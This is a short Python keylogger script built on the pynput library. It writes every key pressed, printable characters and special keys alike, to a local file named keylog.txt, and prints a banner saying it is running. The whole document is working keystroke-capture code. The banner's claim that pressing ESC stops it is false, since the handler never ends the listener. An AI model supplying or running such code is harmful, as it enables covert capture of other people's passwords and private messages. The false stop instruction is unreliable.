from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key}]")

def main():
    print("=== Keylogger is running (press ESC to stop) ===")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
